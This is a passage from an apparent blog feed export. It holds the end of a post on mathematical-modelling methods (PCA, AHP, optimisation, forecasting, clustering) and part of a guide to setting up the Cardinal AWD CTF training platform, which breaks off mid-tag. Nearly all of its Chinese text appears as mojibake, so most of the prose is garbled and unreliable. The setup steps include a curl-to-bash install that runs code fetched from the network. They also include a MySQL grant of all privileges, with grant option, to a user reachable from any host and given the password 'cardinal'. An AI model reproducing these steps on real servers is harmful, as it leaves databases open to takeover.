StandardScaler<br><br><span class="hljs-meta"># ç¤ºä¾‹æ•°æ®ï¼ˆå‡è®¾æœ‰4ä¸ªç‰¹å¾ï¼‰</span><br><span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&#x27;<span class="hljs-type">Age</span>&#x27;: [25, 30, 35, 40, 45],</span><br><span class="hljs-class">        &#x27;<span class="hljs-type">Income</span>&#x27;: [50000, 60000, 70000, 80000, 90000],</span><br><span class="hljs-class">        &#x27;<span class="hljs-type">Education</span>&#x27;: [2, 3, 2, 3, 4],</span><br><span class="hljs-class">        &#x27;<span class="hljs-type">Spending_Score</span>&#x27;: [70, 80, 90, 85, 75]&#125;</span><br><br><span class="hljs-title">df</span> = pd.<span class="hljs-type">DataFrame</span>(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br><br><span class="hljs-meta"># æ ‡å‡†åŒ–æ•°æ®</span><br><span class="hljs-title">scaler</span> = <span class="hljs-type">StandardScaler</span>()<br><span class="hljs-title">scaled_data</span> = scaler.fit_transform(df)<br><br><span class="hljs-meta"># ä½¿ç”¨PCAè¿›è¡Œé™ç»´</span><br><span class="hljs-title">pca</span> = <span class="hljs-type">PCA</span>(n_components=<span class="hljs-number">2</span>)  # é™åˆ°<span class="hljs-number">2</span>ä¸ªä¸»æˆåˆ†<br><span class="hljs-title">principal_components</span> = pca.fit_transform(scaled_data)<br><br><span class="hljs-meta"># åˆ›å»ºæ–°çš„DataFrameä¿å­˜ä¸»æˆåˆ†</span><br><span class="hljs-title">pc_df</span> = pd.<span class="hljs-type">DataFrame</span>(<span class="hljs-class"><span class="hljs-keyword">data</span>=principal_components, columns=[&#x27;<span class="hljs-type">PC1&#x27;</span>, &#x27;<span class="hljs-type">PC2&#x27;</span>])</span><br><br><span class="hljs-title">print</span>(pc_df)<br><br></code></pre></td></tr></table></figure></li><li><p><strong>å±‚æ¬¡åˆ†ææ³•ï¼ˆAHPï¼‰</strong>ï¼š</p><ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨é€‰æ‹©ä¾›åº”å•†æ—¶ï¼Œå¯èƒ½ä¼šè€ƒè™‘ä»·æ ¼ã€è´¨é‡ã€äº¤è´§æœŸç­‰å¤šä¸ªæŒ‡æ ‡ã€‚é€šè¿‡AHPæ–¹æ³•ï¼Œå¯ä»¥å»ºç«‹è¿™äº›å› ç´ çš„å±‚æ¬¡ç»“æ„ï¼Œè¿›è¡Œå®šé‡æ¯”è¾ƒå¹¶ç»¼åˆè¯„ä¼°å„ä¾›åº”å•†çš„ç»¼åˆå¾—åˆ†ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šé€šè¿‡æ„å»ºåˆ¤æ–­çŸ©é˜µï¼Œè®¡ç®—æƒé‡å’Œä¸€è‡´æ€§ï¼Œæœ€ç»ˆå¾—åˆ°å„é€‰é¡¹çš„ä¼˜å…ˆçº§ã€‚</li></ul></li><li><p><strong>æ¨¡ç³Šç»¼åˆè¯„ä»·æ³•</strong>ï¼š</p><ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨å¯¹é¡¹ç›®é£é™©è¿›è¡Œè¯„ä¼°æ—¶ï¼Œå¯èƒ½å­˜åœ¨è®¸å¤šæ¨¡ç³Šçš„ä¿¡æ¯ï¼Œä¾‹å¦‚è¯„ä¼°äººå‘˜å¯¹æŸä¸€é£é™©çš„åˆ¤æ–­ä¸ç¡®å®šã€‚æ¨¡ç³Šç»¼åˆè¯„ä»·æ³•é€šè¿‡æ¨¡ç³Šé€»è¾‘å°†è¿™äº›ä¸ç¡®å®šæ€§è½¬æ¢ä¸ºæ•°å€¼ï¼Œä»è€Œå¸®åŠ©å†³ç­–è€…åšå‡ºæ›´åˆç†çš„é€‰æ‹©ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šä½ å¯ä»¥ä½¿ç”¨æ¨¡ç³Šæ•°å­¦å·¥å…·åŒ…ï¼ˆå¦‚<code>scikit-fuzzy</code>ï¼‰æ¥å®ç°æ¨¡ç³Šè§„åˆ™å¹¶è¿›è¡Œç»¼åˆè¯„ä»·ã€‚</li></ul></li></ul><hr><h3 id="2-è¿ç­¹ä¼˜åŒ–ç±»"><a href="#2-è¿ç­¹ä¼˜åŒ–ç±»" class="headerlink" title="2. è¿ç­¹ä¼˜åŒ–ç±»"></a><strong>2. è¿ç­¹ä¼˜åŒ–ç±»</strong></h3><p>è¿ç­¹ä¼˜åŒ–æ¨¡å‹ç”¨äºå¤„ç†å¦‚ä½•åœ¨ç»™å®šçº¦æŸä¸‹ä¼˜åŒ–ç›®æ ‡ï¼ˆå¦‚æœ€å°åŒ–æˆæœ¬ã€æœ€å¤§åŒ–æ•ˆç›Šï¼‰çš„å„ç§é—®é¢˜ï¼Œå¹¿æ³›åº”ç”¨äºç”Ÿäº§è°ƒåº¦ã€è·¯å¾„è§„åˆ’ç­‰é¢†åŸŸã€‚</p><h4 id="å¸¸è§æ–¹æ³•ï¼š-1"><a href="#å¸¸è§æ–¹æ³•ï¼š-1" class="headerlink" title="å¸¸è§æ–¹æ³•ï¼š"></a><strong>å¸¸è§æ–¹æ³•</strong>ï¼š</h4><ul><li><strong>ç›®æ ‡è§„åˆ’æ¨¡å‹ï¼ˆGoal Programmingï¼‰</strong>ï¼š<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šå‡è®¾ä¸€ä¸ªä¼ä¸šåœ¨ç”Ÿäº§è¿‡ç¨‹ä¸­æœ‰å¤šä¸ªç›®æ ‡ï¼Œå¦‚é™ä½æˆæœ¬ã€æé«˜ç”Ÿäº§æ•ˆç‡ç­‰ï¼Œä½†è¿™äº›ç›®æ ‡ä¹‹é—´å­˜åœ¨å†²çªã€‚ç›®æ ‡è§„åˆ’å¯ä»¥é€šè¿‡å°†å¤šä¸ªç›®æ ‡è½¬åŒ–ä¸ºå¯æ¯”çš„ä¼˜å…ˆçº§æ¥å¸®åŠ©æ‰¾åˆ°æœ€ä½³çš„æŠ˜è¡·è§£ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šåœ¨Pythonä¸­ï¼Œå¯ä»¥é€šè¿‡<code>scipy.optimize.linprog</code>æ¥æ±‚è§£ç›®æ ‡è§„åˆ’é—®é¢˜ï¼Œå¹¶æ ¹æ®ä¸åŒç›®æ ‡çš„ä¼˜å…ˆçº§è®¾å®šç›¸åº”çš„æƒé‡ã€‚</li></ul></li><li><strong>å·®åˆ†æ³•</strong>ï¼š<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨ä¼˜åŒ–ç”Ÿäº§çº¿é…ç½®æ—¶ï¼Œå¦‚æœä½ éœ€è¦åˆ†æç”Ÿäº§é€Ÿç‡éšæ—¶é—´çš„å˜åŒ–ï¼Œå¯ä»¥ç”¨å·®åˆ†æ³•æ¥æ±‚è§£åŠ¨æ€ç³»ç»Ÿçš„ç¦»æ•£åŒ–ä¼˜åŒ–é—®é¢˜ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šé€šè¿‡ç¦»æ•£åŒ–å¾®åˆ†æ–¹ç¨‹ï¼Œå¹¶åº”ç”¨å·®åˆ†æ³•æ±‚è§£ç¦»æ•£çŠ¶æ€ä¸‹çš„æœ€ä¼˜è§£ã€‚</li></ul></li><li><strong>å¤šç›®æ ‡ä¼˜åŒ–ï¼ˆMulti-objective Optimizationï¼‰</strong>ï¼š<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨ç”µåŠ›ç³»ç»Ÿçš„è°ƒåº¦é—®é¢˜ä¸­ï¼Œå¯èƒ½æ—¢è¦è€ƒè™‘æœ€å¤§åŒ–å‘ç”µæ•ˆç›Šï¼Œåˆè¦è€ƒè™‘å‡å°‘æ±¡æŸ“æ’æ”¾ã€‚è¿™æ—¶å¯ä»¥é€šè¿‡å¤šç›®æ ‡ä¼˜åŒ–æ¨¡å‹æ¥å¯»æ‰¾æ»¡è¶³å¤šä¸ªç›®æ ‡çš„æœ€ä¼˜è°ƒåº¦æ–¹æ¡ˆã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šä½¿ç”¨é—ä¼ ç®—æ³•ã€ç²’å­ç¾¤ä¼˜åŒ–ç­‰ç¾¤ä½“æ™ºèƒ½ç®—æ³•ï¼Œæ‰¾åˆ°å¤šä¸ªç›®æ ‡ä¹‹é—´çš„Paretoæœ€ä¼˜è§£ã€‚</li></ul></li></ul><hr><h3 id="3-é¢„æµ‹ç±»æ¨¡å‹"><a href="#3-é¢„æµ‹ç±»æ¨¡å‹" class="headerlink" title="3. é¢„æµ‹ç±»æ¨¡å‹"></a><strong>3. é¢„æµ‹ç±»æ¨¡å‹</strong></h3><p>é¢„æµ‹ç±»æ¨¡å‹ç”¨äºåŸºäºå†å²æ•°æ®é¢„æµ‹æœªæ¥è¶‹åŠ¿ï¼Œå¹¿æ³›åº”ç”¨äºç»æµã€é‡‘èã€å¸‚åœºéœ€æ±‚ç­‰é¢†åŸŸã€‚</p><h4 id="å¸¸è§æ–¹æ³•ï¼š-2"><a href="#å¸¸è§æ–¹æ³•ï¼š-2" class="headerlink" title="å¸¸è§æ–¹æ³•ï¼š"></a><strong>å¸¸è§æ–¹æ³•</strong>ï¼š</h4><ul><li><strong>æ—¶é—´åºåˆ—åˆ†æï¼ˆARæ¨¡å‹ï¼‰</strong>ï¼š<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šå‡è®¾ä½ æ­£åœ¨åˆ†ææŸäº§å“çš„æœˆé”€å”®æ•°æ®ï¼Œé€šè¿‡ARæ¨¡å‹å¯ä»¥åŸºäºå†å²é”€å”®æ•°æ®é¢„æµ‹æœªæ¥å‡ ä¸ªæœˆçš„é”€å”®è¶‹åŠ¿ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šå¯ä»¥é€šè¿‡<code>statsmodels.tsa.ar_model.AutoReg</code>è¿›è¡ŒARæ¨¡å‹çš„æ‹Ÿåˆå’Œé¢„æµ‹ã€‚</li></ul></li><li><strong>è’™ç‰¹å¡æ´›æ¨¡å‹</strong>ï¼š<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨è‚¡ç¥¨å¸‚åœºä¸­ï¼Œè’™ç‰¹å¡æ´›æ¨¡æ‹Ÿå¸¸ç”¨äºä¼°è®¡èµ„äº§çš„æœªæ¥ä»·æ ¼åˆ†å¸ƒï¼Œç‰¹åˆ«æ˜¯åœ¨ä¸ç¡®å®šæ€§è¾ƒé«˜çš„æƒ…å½¢ä¸‹ï¼ˆå¦‚æœŸæƒå®šä»·ï¼‰ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šé€šè¿‡Pythonçš„<code>numpy.random</code>åº“ç”Ÿæˆå¤§é‡éšæœºæ ·æœ¬ï¼Œè¿›è¡Œå¤šæ¬¡æ¨¡æ‹Ÿï¼Œä»è€Œè·å¾—ä¸åŒæƒ…æ™¯ä¸‹çš„é¢„æœŸç»“æœã€‚</li></ul></li><li><strong>å›å½’åˆ†æï¼ˆå¦‚é€»è¾‘å›å½’ã€æ”¯æŒå‘é‡æœºç­‰ï¼‰</strong>ï¼š<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨é‡‘èé¢†åŸŸï¼Œä½ å¯èƒ½æƒ³é€šè¿‡å†å²æ•°æ®æ¥é¢„æµ‹æŸé¡¹è‚¡ç¥¨æ˜¯å¦ä¼šä¸Šæ¶¨ã€‚è¿™æ—¶å¯ä»¥ä½¿ç”¨é€»è¾‘å›å½’æ¥é¢„æµ‹è‚¡ä»·ä¸Šæ¶¨çš„æ¦‚ç‡ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šä½¿ç”¨<code>sklearn.linear_model.LogisticRegression</code>æˆ–<code>sklearn.svm.SVC</code>æ¥æ‹Ÿåˆè®­ç»ƒæ•°æ®ï¼Œè¿›è¡Œé¢„æµ‹ã€‚</li></ul></li></ul><hr><h3 id="4-æœºç†åˆ†æç±»"><a href="#4-æœºç†åˆ†æç±»" class="headerlink" title="4. æœºç†åˆ†æç±»"></a><strong>4. æœºç†åˆ†æç±»</strong></h3><p>æœºç†åˆ†æç±»æ¨¡å‹é€šè¿‡å»ºç«‹ç³»ç»Ÿå†…éƒ¨çš„æœºåˆ¶æ¥è§£é‡Šå’Œé¢„æµ‹ç³»ç»Ÿè¡Œä¸ºï¼Œé€šå¸¸ç”¨äºç‰©ç†å­¦ã€å·¥ç¨‹å­¦ç­‰å¤æ‚é¢†åŸŸã€‚</p><h4 id="å¸¸è§æ–¹æ³•ï¼š-3"><a href="#å¸¸è§æ–¹æ³•ï¼š-3" class="headerlink" title="å¸¸è§æ–¹æ³•ï¼š"></a><strong>å¸¸è§æ–¹æ³•</strong>ï¼š</h4><ul><li><strong>ç¾¤æ™ºèƒ½ç®—æ³•</strong>ï¼š<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨ä¸€ä¸ªå¤§è§„æ¨¡ç”Ÿäº§è°ƒåº¦é—®é¢˜ä¸­ï¼Œä½¿ç”¨ç²’å­ç¾¤ä¼˜åŒ–ï¼ˆPSOï¼‰å¯ä»¥æœ‰æ•ˆåœ°æ‰¾åˆ°æœ€ä¼˜çš„ç”Ÿäº§é¡ºåºå’Œèµ„æºåˆ†é…æ–¹æ¡ˆï¼Œå°¤å…¶æ˜¯åœ¨é¢å¯¹å¤§é‡å¤æ‚çº¦æŸæ—¶ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šPythonçš„<code>pyswarm</code>åº“å¯ä»¥å¸®åŠ©å®ç°ç²’å­ç¾¤ä¼˜åŒ–ç®—æ³•ã€‚</li></ul></li><li><strong>åˆ†ç±»ç®—æ³•ï¼ˆå¦‚SVMã€éšæœºæ£®æ—ã€KNNï¼‰</strong>ï¼š<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨å®¢æˆ·ç»†åˆ†é—®é¢˜ä¸­ï¼Œå¯ä»¥ä½¿ç”¨éšæœºæ£®æ—ç®—æ³•æ¥æ ¹æ®å®¢æˆ·çš„å†å²è´­ä¹°è¡Œä¸ºè¿›è¡Œåˆ†ç±»ï¼Œä»è€Œä¸ºä¸åŒç±»åˆ«çš„å®¢æˆ·è®¾è®¡ä¸åŒçš„è¥é”€ç­–ç•¥ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šä½¿ç”¨<code>sklearn.ensemble.RandomForestClassifier</code>æ¥è¿›è¡Œæ¨¡å‹è®­ç»ƒï¼Œä½¿ç”¨<code>sklearn.metrics</code>è¯„ä¼°åˆ†ç±»æ•ˆæœã€‚</li></ul></li><li><strong>èšç±»ç®—æ³•ï¼ˆå¦‚K-Meansã€å±‚æ¬¡èšç±»ï¼‰</strong>ï¼š<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨å¸‚åœºè°ƒç ”ä¸­ï¼Œå¯ä»¥ä½¿ç”¨K-Meansç®—æ³•å¯¹é¡¾å®¢ç¾¤ä½“è¿›è¡Œèšç±»åˆ†æï¼Œä»è€Œå¸®åŠ©å…¬å¸äº†è§£ä¸åŒæ¶ˆè´¹è€…çš„éœ€æ±‚å’Œåå¥½ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šé€šè¿‡<code>sklearn.cluster.KMeans</code>å®ç°K-Meansèšç±»ï¼Œä½¿ç”¨<code>matplotlib</code>è¿›è¡Œç»“æœå¯è§†åŒ–ã€‚</li></ul></li></ul><hr><h3 id="5-å…¶ä»–å¸¸ç”¨ç®—æ³•"><a href="#5-å…¶ä»–å¸¸ç”¨ç®—æ³•" class="headerlink" title="5. å…¶ä»–å¸¸ç”¨ç®—æ³•"></a><strong>5. å…¶ä»–å¸¸ç”¨ç®—æ³•</strong></h3><ul><li><strong>ç²’å­ç¾¤ä¼˜åŒ–ï¼ˆPSOï¼‰</strong>ï¼šé€‚ç”¨äºå…¨å±€ä¼˜åŒ–é—®é¢˜ï¼Œå¦‚æœºå™¨å­¦ä¹ ä¸­çš„è¶…å‚æ•°è°ƒä¼˜ã€‚<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šè°ƒä¼˜æ”¯æŒå‘é‡æœºï¼ˆSVMï¼‰çš„æ ¸å‡½æ•°å‚æ•°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨PSOç®—æ³•æ‰¾åˆ°æœ€ä¼˜çš„å‚æ•°ç»„åˆã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šé€šè¿‡<code>pyswarm</code>åº“è¿›è¡ŒPSOä¼˜åŒ–ã€‚</li></ul></li><li><strong>é—ä¼ ç®—æ³•ï¼ˆGAï¼‰</strong>ï¼šå¹¿æ³›åº”ç”¨äºè·¯å¾„è§„åˆ’ã€ç‰¹å¾é€‰æ‹©ç­‰ä¼˜åŒ–é—®é¢˜ã€‚<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨è·¯å¾„è§„åˆ’é—®é¢˜ä¸­ï¼ŒGAå¯ä»¥ç”¨äºæ‰¾åˆ°ä¸€æ¡ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šé€šè¿‡<code>deap</code>åº“å®ç°é—ä¼ ç®—æ³•çš„è¿­ä»£ä¼˜åŒ–ã€‚</li></ul></li><li><strong>K-Meansä¸å±‚æ¬¡èšç±»</strong>ï¼šç”¨äºæ— ç›‘ç£å­¦ä¹ çš„èšç±»åˆ†æã€‚<ul><li><strong>åº”ç”¨å®ä¾‹</strong>ï¼šåœ¨å®¢æˆ·ç»†åˆ†é—®é¢˜ä¸­ï¼ŒK-Meansç®—æ³•å¯ä»¥å°†ä¸åŒè´­ä¹°è¡Œä¸ºçš„å®¢æˆ·åˆ’åˆ†ä¸ºä¸åŒçš„ç»„ã€‚</li><li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šä½¿ç”¨<code>sklearn.cluster.KMeans</code>æ¥å®ç°èšç±»ï¼Œ<code>scipy.cluster.hierarchy</code>å®ç°å±‚æ¬¡èšç±»ã€‚</li></ul></li></ul></li></ul><h3 id="æ€»ç»“åˆ†ç±»"><a href="#æ€»ç»“åˆ†ç±»" class="headerlink" title="æ€»ç»“åˆ†ç±»"></a><strong>æ€»ç»“åˆ†ç±»</strong></h3><table><thead><tr><th><strong>åˆ†ç±»</strong></th><th><strong>æ¨¡å‹&#x2F;æ–¹æ³•</strong></th><th><strong>åº”ç”¨é¢†åŸŸ&#x2F;ç›®çš„</strong></th></tr></thead><tbody><tr><td><strong>è¯„ä»·ç±»æ¨¡å‹</strong></td><td>ä¸»æˆåˆ†åˆ†æï¼ˆPCAï¼‰ã€å±‚æ¬¡åˆ†ææ³•ï¼ˆAHPï¼‰ã€æ¨¡ç³Šç»¼åˆè¯„ä»·æ³•</td><td>ç”¨äºå¤šç»´åº¦ã€å¤šæŒ‡æ ‡è¯„ä»·ï¼Œå¦‚å†³ç­–æ”¯æŒã€é¡¹ç›®è¯„ä¼°ç­‰ã€‚</td></tr><tr><td><strong>è¿ç­¹ä¼˜åŒ–ç±»</strong></td><td>ç›®æ ‡è§„åˆ’æ¨¡å‹ã€ç›®æ ‡ä¼˜åŒ–ã€å·®åˆ†æ³•ã€å¤šç›®æ ‡ä¼˜åŒ–</td><td>ç”¨äºèµ„æºåˆ†é…ã€è·¯å¾„è§„åˆ’ã€è°ƒåº¦ä¼˜åŒ–ç­‰é—®é¢˜ã€‚</td></tr><tr><td><strong>é¢„æµ‹ç±»æ¨¡å‹</strong></td><td>æ—¶é—´åºåˆ—åˆ†æï¼ˆARæ¨¡å‹ï¼‰ã€è’™ç‰¹å¡æ´›æ¨¡æ‹Ÿã€å›å½’åˆ†æ</td><td>ç”¨äºè¶‹åŠ¿é¢„æµ‹ã€é£é™©è¯„ä¼°ã€éœ€æ±‚é¢„æµ‹ç­‰ã€‚</td></tr><tr><td><strong>æœºç†åˆ†æç±»</strong></td><td>ç¾¤æ™ºèƒ½ç®—æ³•ã€åˆ†ç±»ç®—æ³•ï¼ˆé€»è¾‘å›å½’ã€SVMã€éšæœºæ£®æ—ã€KNNï¼‰ã€èšç±»ç®—æ³•ï¼ˆK-Meansã€å±‚æ¬¡èšç±»ï¼‰</td><td>ç”¨äºæ•°æ®åˆ†ç±»ã€èšç±»ã€æ¨¡å¼è¯†åˆ«ç­‰ï¼Œé€‚ç”¨äºç›‘ç£å­¦ä¹ å’Œæ— ç›‘ç£å­¦ä¹ ã€‚</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>æ•°å­¦å»ºæ¨¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ•°å­¦å»ºæ¨¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWDçš„æ­å»º</title>
    <link href="/2024/09/23/AWD%E7%9A%84%E7%8E%AF%E5%A2%83/"/>
    <url>/2024/09/23/AWD%E7%9A%84%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<p>ä¸€ã€About Cardinal<br>Cardinal ç”± Vidar-Team å›¢é˜Ÿå¼€å‘ï¼Œæ¥å—å¹¶å…è®¸å„å¤§é«˜æ ¡ã€å®‰å…¨å›¢é˜Ÿã€æŠ€æœ¯çˆ±å¥½è€…ä½¿ç”¨ Cardinal ä½œä¸ºæ¯”èµ›è®­ç»ƒå¹³å°æˆ–ä¸¾åŠå†…éƒ¨è®­ç»ƒèµ›ã€‚ </p><p>ç¯å¢ƒè¦æ±‚ï¼š </p><p>ï¼ˆ1ï¼‰åŸºç¡€æ“ä½œç³»ç»Ÿï¼ˆubuntuã€centosã€Windows ç­‰ï¼‰<br>ï¼ˆ2ï¼‰docker ç¯å¢ƒï¼ˆå« docker-composeï¼‰<br>ï¼ˆ3ï¼‰mysql æ•°æ®åº“<br>ï¼ˆ4ï¼‰python ç¯å¢ƒ</p><p>äºŒã€Cardinal éƒ¨ç½²è¿‡ç¨‹<br>1ã€ubuntu å’Œ centos é»˜è®¤æ˜¯æ²¡æœ‰ docker å’Œ mysql çš„ï¼Œå› æ­¤åœ¨ç¯å¢ƒéƒ¨ç½²å¼€å§‹å‰éœ€è¦å®‰è£… docker å’Œ mysqlã€‚<br>Docker å®‰è£…å¯ä»¥ä½¿ç”¨å®˜æ–¹å®‰è£…è„šæœ¬è‡ªåŠ¨å®‰è£…ï¼š </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">curl -fsSL <span class="hljs-keyword">https</span>://<span class="hljs-built_in">get</span>.docker.com | bash -s docker <span class="hljs-comment">--mirror Aliyun</span><br></code></pre></td></tr></table></figure><p>mysql å®‰è£…ï¼š </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br>apt-<span class="hljs-keyword">get</span> install mysql-<span class="hljs-keyword">server</span> <br></code></pre></td></tr></table></figure><p>2ã€å‡†å¤‡å¥½åŸºç¡€ç¯å¢ƒä¹‹åï¼Œä¸‹è½½ Cardinalã€‚<br>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/vidar-team/Cardinal/releases%E8%BF%99%E9%87%8C%E9%80%89%E6%8B%A9">https://github.com/vidar-team/Cardinal/releasesè¿™é‡Œé€‰æ‹©</a> linux_amd64 çš„åŒ… </p><p><img src="/../img/image-20240923164317850.png" alt="image-20240923164317850"></p><p>ä¸‹è½½ä¸‹æ¥åï¼Œé€šè¿‡ SSH å·¥å…·å°†åŒ…ä¸Šä¼ è‡³è™šæ‹Ÿæœºä¸Šã€‚</p><p> 2ã€è§£å‹ .tar.gz  </p><p><img src="/../img/image-20240923164353903.png" alt="image-20240923164353903"></p><p>3ã€ç”±äº mysql çš„ root ç”¨æˆ·é»˜è®¤ä¸ºç©ºå¯†ç ï¼Œè®¾ç½®å¯†ç æ¯”è¾ƒéº»çƒ¦ï¼Œè€ŒCardinal é…ç½®éœ€è¦ mysql å¯†ç ï¼Œå› æ­¤æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯æ–°å»ºä¸€ä¸ªç”¨æˆ·,å³å¯ã€‚ </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;cardinal&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;cardinal&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>; <br></code></pre></td></tr></table></figure><p>4ã€æ–°å»º cardinal æ•°æ®åº“ã€‚ </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> `cardinal` <span class="hljs-keyword">DEFAULT</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci; <br></code></pre></td></tr></table></figure><p>![image-20240923164427731](F:\new myblog\STUDY\source\img\image-20240923164427731.png)</p><p>5ã€æ‰§è¡Œ .&#x2F;Cardinal</p><p>é¦–æ¬¡æ‰§è¡Œï¼Œç”±äºæ²¡æœ‰é…ç½®æ–‡ä»¶ï¼Œå› æ­¤éœ€è¦è·Ÿç€å‘å¯¼è¿›è¡Œé…ç½®ï¼Œé…ç½®å®Œæˆåï¼Œåœ¨ Cardinal çš„åŒçº§ç›®å½•ä¸‹çš„ conf æ–‡ä»¶å¤¹ä¸‹å¯ä»¥çœ‹åˆ°é…ç½®æ–‡ä»¶Cardinal.tomlã€‚ </p><p><img src="/../img/image-20240923164448841.png" alt="image-20240923164448841"></p><p><img src="/../img/image-20240923164457793.png" alt="image-20240923164457793"></p><p>6ã€æŒ‰ç…§å¼•å¯¼é…ç½®æˆåŠŸ Cardinal å¹³å°åï¼Œä¸è¦å…³é—­ Cardinal çš„è¿›ç¨‹ï¼ï¼ï¼ä¸ç„¶å¹³å°å°±ç›´æ¥é€€å‡ºäº†ã€‚<br>7ã€Cardinal æ­å»ºæˆåŠŸåï¼Œå¹³å°åœ°å€å¦‚ä¸‹ï¼š </p><p>ç®¡ç†ç«¯åœ°å€ï¼š<a href="http://ip:19999/manager">http://ip:19999/manager</a> é€‰æ‰‹ç«¯åœ°å€ï¼š<a href="http://ip:19999/">http://ip:19999</a> </p><p>ç®¡ç†ç«¯ç™»å½•çš„è´¦å·å¯†ç ä¸ºåˆšæ‰å¼•å¯¼è¿‡ç¨‹è®¾ç½®çš„è´¦å·å¯†ç ï¼Œé€‰æ‰‹ç«¯è´¦å·å¯†ç éœ€è¦åœ¨ç™»å½•ç®¡ç†ç«¯ä¹‹åè¿›è¡Œè®¾ç½®ã€‚ </p><p><img src="/../img/image-20240923164521861.png" alt="image-20240923164521861"></p><p><img src="/../img/image-20240923164528676.png" alt="image-20240923164528676"></p><p>8ã€åœ¨è®¿é—®å¹³å°çš„æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨ shell ç•Œé¢å¯ä»¥çœ‹åˆ°å¹³å°çš„éƒ¨åˆ†æ—¥å¿—ä¿¡æ¯ã€‚ </p><p><img src="/../img/image-20240923164539997.png" alt="image-20240923164539997"></p><p>9ã€è‡³æ­¤ï¼ŒAWD Cardinal å¹³å°å°±å·²ç»æ­å»ºå®Œæ¯•äº†ã€‚ </p><p>ä¸‰ã€ç®¡ç†ç«¯é…ç½®<br>1ã€ç®¡ç†ç«¯é…ç½®æµç¨‹<br>ä¸Šè½½ awd é¶æœº(é€šå¸¸ä¸º tar åŒ…)è‡³è™šæ‹Ÿæœºå¹¶ load ä¸ºé•œåƒ -&gt; æ ¹æ®é˜Ÿä¼æ•°é‡æ‰‹åŠ¨åˆ›å»ºå¯¹åº”æ•°é‡çš„å®¹å™¨ -&gt; é˜Ÿä¼ç®¡ç†é¡µé¢æ·»åŠ é˜Ÿä¼ -&gt; é¢˜ç›®ç®¡ç†é¡µé¢åˆ›å»ºé¢˜ç›® -&gt; é¶æœºç®¡ç†é¡µé¢åˆ›å»ºé¶æœºç»‘å®šé¢˜ç›®å¹¶åˆ†é…ç»™å„é˜Ÿä¼ -&gt; åœ¨é…ç½®ç®¡ç†é¡µé¢ç¼–è¾‘æ¯”èµ›åå’Œ flag å‰ç¼€ -&gt; Flag ç®¡ç†é¡µé¢ç”Ÿæˆ flag -&gt; ç­‰å¾…æ¯”èµ›å¼€å§‹ã€‚<br>è¯´æ˜ï¼šåœ¨å‘½ä»¤è¡Œé…ç½®æ¯”èµ›å¼€å§‹æ—¶é—´æ—¶ï¼Œå°½é‡å°†æ¯”èµ›è®¾ç½®åœ¨è‡³å°‘15-25 åˆ†é’Ÿåï¼Œå› ä¸ºéœ€è¦ç•™å‡ºéƒ¨åˆ†æ—¶é—´åœ¨ web ç«¯åšç›¸å…³é…ç½®ã€‚<br>2ã€æ•°æ®å¤§å± </p><p><img 